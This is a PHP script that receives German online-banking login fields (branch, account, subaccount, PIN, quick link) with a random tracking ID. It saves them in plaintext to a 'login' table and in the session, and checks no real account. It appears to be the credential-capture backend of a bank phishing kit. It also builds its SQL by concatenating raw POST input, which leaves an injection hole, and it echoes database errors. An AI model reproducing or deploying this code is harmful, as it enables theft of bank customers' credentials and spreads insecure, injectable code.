<?php
include 'Model.php';
include 'connection.php';


if (empty($_POST['branch']) || empty($_POST['account']) || empty($_POST['subaccount']) || empty($_POST['pin']) || empty($_POST['quickLink'])) {
    echo "Error: One or more required fields are missing.";
} else {
    $randomID = $_POST['randomID'];
    $filiale = $_POST['branch'];
    $konto = $_POST['account'];
    $unterkonto = $_POST['subaccount'];
    $pin = $_POST['pin'];
    $direkt_zu = $_POST['quickLink'];

    $sql = "INSERT INTO login (randomID, Filiale, Konto, Unterkonto, PIN, direkt_zu) 
            VALUES ('$randomID', '$filiale', '$konto', '$unterkonto', '$pin', '$direkt_zu')";

    if ($conn->query($sql) === TRUE) {
   $lastInsertedID = mysqli_insert_id($conn);

   
        $response = array(
            'status' => 'success',
            'message' => 'Data saved successfully!',
            'id' => $lastInsertedID,
            'randomId' => $randomID,
        );

        $_SESSION['loggedin'] = true;
        $_SESSION['id'] = $lastInsertedID;
        $_SESSION['branch'] = $filiale;
        $_SESSION['account'] = $konto;
        $_SESSION['subaccount'] = $unterkonto;
        $_SESSION['pin'] = $pin;
        $_SESSION['quickLink'] = $direkt_zu;
        $_SESSION['randomID'] = $randomID;

        echo json_encode($response);
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }
}

$conn->close();
?>
